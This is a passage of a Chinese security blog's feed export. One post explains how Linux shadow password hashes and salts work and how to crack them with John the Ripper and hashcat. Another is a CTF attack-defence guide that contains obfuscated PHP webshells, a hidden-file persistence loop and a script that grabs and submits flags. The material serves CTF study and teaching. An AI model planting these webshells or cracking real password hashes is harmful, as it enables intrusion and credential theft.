class="built_in">fprintf</span> (<span class="built_in">stderr</span>,</span><br><span class="line">             _(<span class="string">"crypt method not supported by libcrypt? (%s)\n"</span>),</span><br><span class="line">             method);</span><br><span class="line">        <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span> (cp) != <span class="number">13</span>)</span><br><span class="line">       <span class="keyword">return</span> cp; </span><br><span class="line">    <span class="built_in">strcpy</span> (cipher, cp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher;</span><br><span class="line"> &#125;  </span><br></pre></td></tr></table></figure></p><p>也就是说加密用明文密码和一个叫salt的东西用crypt（）加密生成密文。<br>再来看看crypt的帮助：<br><a href="http://www.kernel.org/doc/man-pages/online/pages/man3/crypt.3.html" target="_blank" rel="noopener">http://www.kernel.org/doc/man-pages/online/pages/man3/crypt.3.html</a><br>可发现原来crypt密文里是由三部分组成的，即：$id$salt$encrypted<br>目前常用的是当id为1时，使用md5加密，id为5，采用SHA256进行加密，id为6采用SHA512进行加密。<br>分析上面的函数，可看出我们的shadow密码中，直接把$id$salt$encrypted 当做salt参数带入进行crypt加密。<br>那好，我们可以写个简短的代码进行试验：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> studio.h</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"no usrname input"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (geteuid() != <span class="number">0</span>)</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"must be setuid root"</span>); </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pwd</span>;</span></span><br><span class="line">pwd = getpwnam(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span>(pwd ==<span class="literal">NULL</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"no username found.\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"passwd: %s\n"</span>, pwd-&gt;pw_passwd);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(pwd-&gt;pw_passwd, <span class="string">"x"</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"shadow used.\n"</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spwd</span> *<span class="title">shd</span>= <span class="title">getspnam</span>(<span class="title">argv</span>[1]);</span></span><br><span class="line"><span class="keyword">if</span>(shd != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> crypt_char[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(crypt_char, shd-&gt;sp_pwdp);</span><br><span class="line"><span class="keyword">char</span> salt[<span class="number">13</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(shd-&gt;sp_pwdp[i]!=<span class="string">'\0'</span>)&#123;</span><br><span class="line">salt[i]=shd-&gt;sp_pwdp[i];</span><br><span class="line"><span class="keyword">if</span>(salt[i]==<span class="string">'$'</span>)&#123;</span><br><span class="line">j++;</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">3</span>)&#123;</span><br><span class="line">salt[i+<span class="number">1</span>]=<span class="string">'\0'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j&lt;<span class="number">3</span>)perror(<span class="string">"file error or user cannot use."</span>);</span><br><span class="line"><span class="keyword">if</span>(argc==<span class="number">3</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"salt: %s, crypt: %s\n"</span>, salt, crypt(argv[<span class="number">2</span>], salt));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"shadowd passwd: %s\n"</span>, shd-&gt;sp_pwdp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存后执行</p><blockquote><p>gcc passwd.c -lcrypt -o passwd</p></blockquote><p>编译成功后运行</p><blockquote><p>./passwd root 123</p></blockquote><p>其中./passwd是生成的命令，root是我们用来测试的账户，123是测试系统中root用户的密码，执行的结果是：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">passwd: x</span><br><span class="line">shadow used.</span><br><span class="line">salt: $<span class="number">1</span>$Bg1H/<span class="number">4</span>mz$, crypt: $<span class="number">1</span>$Bg1H/<span class="number">4</span>mz$X89TqH7tpi9dX1B9j5YsF.</span><br><span class="line">shadowd passwd: $<span class="number">1</span>$Bg1H/<span class="number">4</span>mz$X89TqH7tpi9dX1B9j5YsF.</span><br></pre></td></tr></table></figure><br>可见，我们得到了和系统shadow文件下相同结果的密文。</p><h2 id="salt"><a href="#salt" class="headerlink" title="salt"></a>salt</h2><p>盐（Salt），在密码学中，是指在散列之前将散列内容（例如：密码）的任意固定位置插入特定的字符串。这个在散列中加入字符串的方式称为“加盐”。其作用是让加盐后的散列结果和没有加盐的结果不相同，在不同的应用情景中，这个处理可以增加额外的安全性。<br>在大部分情况，盐是不需要保密的。盐可以是随机产生的字符串，其插入的位置可以也是随意而定。如果这个散列结果在将来需要进行验证（例如：验证用户输入的密码），则需要将已使用的盐记录下来。</p><p>根据我们的运行结果我们可以看到，在root用户的shadow中，他的salt是$1$Bg1H/4mz$<br>我们之前也是用这个salt来进行加密匹配的。但是，问题是：这个salt到底是怎么来的？？</p><p>还是分析标准的passwd.c，<br>在passwd.c中，找到了生成salt的函数：crypt_make_salt</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">crypt_make_salt</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *meth, <span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> result[<span class="number">40</span>];</span><br><span class="line">    <span class="keyword">size_t</span> salt_len = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *method;</span><br><span class="line"></span><br><span class="line">    result[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != meth)</span><br><span class="line">        method = meth;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((method = getdef_str (<span class="string">"ENCRYPT_METHOD"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">        method = getdef_bool (<span class="string">"MD5_CRYPT_ENAB"</span>) ? <span class="string">"MD5"</span> : <span class="string">"DES"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span> (method, <span class="string">"MD5"</span>)) &#123;</span><br><span class="line">        MAGNUM(result, <span class="string">'1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_SHA_CRYPT</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span> (method, <span class="string">"SHA256"</span>)) &#123;</span><br><span class="line">        MAGNUM(result, <span class="string">'5'</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(result, SHA_salt_rounds((<span class="keyword">int</span> *)arg));</span><br><span class="line">        salt_len = SHA_salt_size();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span> (method, <span class="string">"SHA512"</span>)) &#123;</span><br><span class="line">        MAGNUM(result, <span class="string">'6'</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(result, SHA_salt_rounds((<span class="keyword">int</span> *)arg));</span><br><span class="line">        salt_len = SHA_salt_size();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">strcmp</span> (method, <span class="string">"DES"</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>,</span><br><span class="line">             _(<span class="string">"Invalid ENCRYPT_METHOD value: '%s'.\n"</span></span><br><span class="line">               <span class="string">"Defaulting to DES.\n"</span>),</span><br><span class="line">             method);</span><br><span class="line">        result[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    assert (<span class="keyword">sizeof</span> (result) &gt; <span class="built_in">strlen</span> (result) + salt_len);</span><br><span class="line">    <span class="built_in">strncat</span> (result, gensalt (salt_len),</span><br><span class="line">         <span class="keyword">sizeof</span> (result) - <span class="built_in">strlen</span> (result) - <span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了一大段条件判断语句，其实最重要的只有一句gensalt(salt_len)。<br>看看gensalt的定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">gensalt</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> salt_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> salt[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">    salt[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    assert (salt_size &gt;= MIN_SALT_SIZE &amp;&amp;</span><br><span class="line">            salt_size &lt;= MAX_SALT_SIZE);</span><br><span class="line">    seedRNG ();</span><br><span class="line">    <span class="built_in">strcat</span> (salt, l64a (random()));</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">strcat</span> (salt, l64a (random()));</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">strlen</span> (salt) &lt; salt_size);</span><br><span class="line">      salt[salt_size] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> salt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>每次改写密码时，都会再随机生成一个这样的salt。而用户登入时，会拿用户登入的明文密码经过上述演示的步骤生成密文后和shadow里的密码域进行比较。</p><h2 id="密文安全性"><a href="#密文安全性" class="headerlink" title="密文安全性"></a>密文安全性</h2><p>要用到SHA256或者SHA512的密码加密，glic版本需大于2.7。<br>这样的密码还安全吗？答案不是绝对的，如果有不怀好意的人拿到了比如说上面的hash还是可以用字典暴力破解。</p><h1 id="破解用户密码hash的常用工具和方法"><a href="#破解用户密码hash的常用工具和方法" class="headerlink" title="破解用户密码hash的常用工具和方法"></a>破解用户密码hash的常用工具和方法</h1><p>由于Linux的密码加密使用了Salt,所以无法使用彩虹表的方式进行破解,常用的方法为字典破解和暴力破解<br>字典破解和暴力破解的常用工具：</p><h2 id="1、-John-the-Ripper"><a href="#1、-John-the-Ripper" class="headerlink" title="1、 John the Ripper"></a>1、 John the Ripper</h2><p>(1) 字典破解<br>Kali2.0集成了John the Ripper<br>字典文件位于/usr/share/john/password.lst<br>使用Kali Linux上的John自带的密码列表。路径为/usr/share/john/password.lst<br>使用字典破解：</p><blockquote><p>john –wordlist=/usr/share/john/password.lst ./shadow</p></blockquote><p>(2) 暴力破解：</p><blockquote><p>john ./shadow</p></blockquote><p>列出已破解的明文密码：</p><blockquote><p>john –show ./shadow </p></blockquote><p>结果如下图:</p><img src="/2018/11/04/Linux-Unix-OS中password加密及解密方法探究/01.png"><h2 id="2、-hashcat"><a href="#2、-hashcat" class="headerlink" title="2、 hashcat"></a>2、 hashcat</h2><p>Kali2.0集成了hashcat<br>字典文件使用/usr/share/john/password.lst<br>修改hash格式：只保留$salt$encrypted<br>eg.<br>原hash：</p><blockquote><p>test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7:::</p></blockquote><p>修改后：</p><blockquote><p>$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0</p></blockquote><p>(1) 字典破解：</p><blockquote><p>hashcat -m 1800 -o found1.txt –remove shadow /usr/share/john/password.lst </p></blockquote><p>参数说明：<br>-m：hash-type，1800对应SHA-512 详细参数可查表：<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br>-o：输出文件<br>–remove：表示hash被破解后将从hash文件移除<br>shadow：代表hash文件<br>/usr/share/john/password.lst：代表字典文件</p><p>成功破解出2个hash，如下图:<br><img src="/2018/11/04/Linux-Unix-OS中password加密及解密方法探究/02.png"></p><p>(2) 暴力破解：</p><blockquote><p>hashcat -m 1800 -a 3 -o found2.txt shadow ?l?l?l?l –force</p></blockquote><p>参数说明：<br>-a：attack-mode，默认为0，3代表Brute-force，即暴力破解<br>?l：表示小写字母，即abcdefghijklmnopqrstuvwxyz，4个?l代表暴力破解的长度为4<br>?u：表示大写字母，即ABCDEFGHIJKLMNOPQRSTUVWXYZ<br>?h：代表十六进制字符小写，即0123456789<br>?H：代表十六进制字符大写，即0123456789abcdef<br>?s：表示特殊符号，即!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~<br>?a：表示所有字符，即?l?u?d?s<br>?b：表示十六进制，即0x00 - 0xff<br>成功暴力破解出hash，结果如下图:<br><img src="/2018/11/04/Linux-Unix-OS中password加密及解密方法探究/03.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://blog.sina.com.cn/s/blog_615612d701019f4a.html" target="_blank" rel="noopener">[关于Linux系统中的密码加密流程及原理]</a>  </li><li><a href="http://www.fzb.me/2015-5-15-linux-passwd-crypt.html" target="_blank" rel="noopener">Linux 账户密码策略</a></li><li><a href="https://zh.wikipedia.org/wiki/%E7%9B%90_(%E5%AF%86%E7%A0%81%E5%AD%A6)" target="_blank" rel="noopener">[盐_(密码学)]</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 现代密码学 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF之AWD攻防</title>
      <link href="/2018/10/20/CTF%E4%B9%8BAWD%E6%94%BB%E9%98%B2/"/>
      <url>/2018/10/20/CTF%E4%B9%8BAWD%E6%94%BB%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<p>一张常规的CTF线下攻防思维导图</p><h1 id="SSh登录"><a href="#SSh登录" class="headerlink" title="SSh登录"></a>SSh登录</h1><p>两三个人进行分工，一个粗略的看下web，有登陆口的话，就需要修改密码，将情况反馈给队友，让登陆ssh的小伙伴进行密码的修改，改成炒鸡复杂、然后将Web目录下载下来，上WAF、文件监控、端口扫描。将这几个工作分工好，顺序就像图上。</p><p>tips：将下载下来的Web目录理一遍，看是否有可疑的文件夹，比如bak。 依然记得有次比赛，有两台靶机，赛组提示弱口令。然后每一支队伍都奔着后台去了，结果有队伍在Web目录下发现了这个bak目录，打开发现是phpmyadmin，提示的弱口令是在这里用上。</p><a id="more"></a><h1 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h1><p>首先先理清好网络拓扑关系，节点与各链路之间的关联。这个需要下一步配合，要不然不知道对手在哪就GG。 示例：</p><h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p>如果是在同个C段，或者B段，均可以使用RouterScan进行对80端口扫描进行扫描得出，嫌麻烦的话，就用httpscan这个小巧的脚本</p><p>千万要记得扫端口，这很重要。用nmap也行，自己写的脚本或者网上找的也行。</p><h1 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h1><p>有的比赛环境，为了照顾比较菜的选手（此处举手），预留了一句话后门。将整个web目录下载到本地，使用hm.exe、D盾或者别的扫描工具可以扫描得出（如果预留）</p><h1 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h1><p>防御及修复建议 1.将所有的登陆口密码进行修改（炒鸡复杂）； 2.将上传页面的action地址修改为*，（机智小能手！！）； 3.反序列化和命令执行，就去seebug或其他的站点找补丁； 4.待补充…</p><h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。 简单举例：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>连接方式：<code>php?2=assert</code>密码是1。 献上我常用得一句话  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a=chr(<span class="number">96</span>^<span class="number">5</span>);</span><br><span class="line">    $b=chr(<span class="number">57</span>^<span class="number">79</span>);</span><br><span class="line">    $c=chr(<span class="number">15</span>^<span class="number">110</span>);</span><br><span class="line">    $d=chr(<span class="number">58</span>^<span class="number">86</span>);</span><br><span class="line">    $e=<span class="string">'($_REQUEST[C])'</span>;</span><br><span class="line">    @assert($a.$b.$c.$d.$e);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>配置为?b=))99(rhC(tseuqeR+lave</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sF=<span class="string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="number">4</span>].$sF[<span class="number">5</span>].$sF[<span class="number">9</span>].$sF[<span class="number">10</span>].$sF[<span class="number">6</span>].$sF[<span class="number">3</span>].$sF[<span class="number">11</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>].$sF[<span class="number">1</span>].$sF[<span class="number">7</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="number">11</span>].$sF[<span class="number">0</span>].$sF[<span class="number">7</span>].$sF[<span class="number">9</span>].$sF[<span class="number">2</span>])&#125;[<span class="string">'n985de9'</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>($s22))&#123;<span class="keyword">eval</span>($s21($s22));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>配置填<code>n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</code> 连接密码:0（零）</p><h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">    $file = <span class="string">'.demo.php'</span>;</span><br><span class="line">    $shell = <span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">        system(<span class="string">'chmod 777 .demo.php'</span>);</span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>tips:<code>.demo.php</code>前面使用一个点，能很好的隐藏文件。 想要结束这个进程，除了最暴力的重启服务之外，更为优雅的如下:  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    $pid=<span class="number">1234</span>;</span><br><span class="line">    @unlink(<span class="string">'demo.php'</span>);</span><br><span class="line">    exec(<span class="string">'kill -9 $pid'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先查看进程，查看对应的pid，再执行即可。</p><h1 id="Flag获取"><a href="#Flag获取" class="headerlink" title="Flag获取"></a>Flag获取</h1><p>上面的<code>$shell</code>内容看个人，线下赛可以直接使用<code>&lt;?php echo system(&quot;crul 10.0.0.2&quot;); ?&gt;</code>之类的，只是说一个点，剩余的发挥空间由你们思考。 最好能写一个批量上传的，结合批量访问。批量访问参考PHP-定时任务 或者  </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    flag=$(curl <span class="string">'http://172.16.4.42:800'</span>)</span><br><span class="line">    curl --cookie <span class="string">"PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD"</span> --data <span class="string">"key="</span>$&#123;flag&#125; <span class="string">"http://172.16.4.42/index.php/wargame/submit"</span></span><br><span class="line">    sleep <span class="number">1</span>s</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h1 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h1><h2 id="日志分析的用途"><a href="#日志分析的用途" class="headerlink" title="日志分析的用途"></a>日志分析的用途</h2><ul><li>感知可能正在发生的攻击，从而规避存在的安全风险  </li><li>应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失  </li></ul><h2 id="记录log脚本"><a href="#记录log脚本" class="headerlink" title="记录log脚本"></a>记录log脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);</span><br><span class="line">$ip       = $_SERVER[<span class="string">"REMOTE_ADDR"</span>]; <span class="comment">//记录访问者的ip</span></span><br><span class="line">$filename = $_SERVER[<span class="string">'PHP_SELF'</span>];   <span class="comment">//访问者要访问的文件名</span></span><br><span class="line">$parameter   = $_SERVER[<span class="string">"QUERY_STRING"</span>]; <span class="comment">//访问者要请求的参数</span></span><br><span class="line">$time     =   date(<span class="string">'Y-m-d H:i:s'</span>,time()); <span class="comment">//访问时间</span></span><br><span class="line">$logadd = <span class="string">'来访时间：'</span>.$time.<span class="string">'--&gt;'</span>.<span class="string">'访问链接：'</span>.<span class="string">'http://'</span>.$ip.$filename.<span class="string">'?'</span>.$parameter.<span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// log记录</span></span><br><span class="line">$fh = fopen(<span class="string">"log.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line">fclose($fh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具"></a>日志分析工具</h2><ol><li>LogForensics 腾讯实验室  <a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="noopener">https://security.tencent.com/index.php/opensource/detail/15</a></li><li>北风飘然@金乌网络安全实验室  <a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/126698.html</a>  </li><li>网络ID为piaox的安全从业人员： <a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/110644.html</a>  </li><li>网络ID：SecSky   <a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/8982.html</a></li><li>网络ID：鬼魅羊羔  <a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/96675.html</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>咸鱼的信安之路</title>
      <link href="/2018/09/19/%E5%92%B8%E9%B1%BC%E7%9A%84%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/"/>
      <url>/2018/09/19/%E5%92%B8%E9%B1%BC%E7%9A%84%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/</url>
      
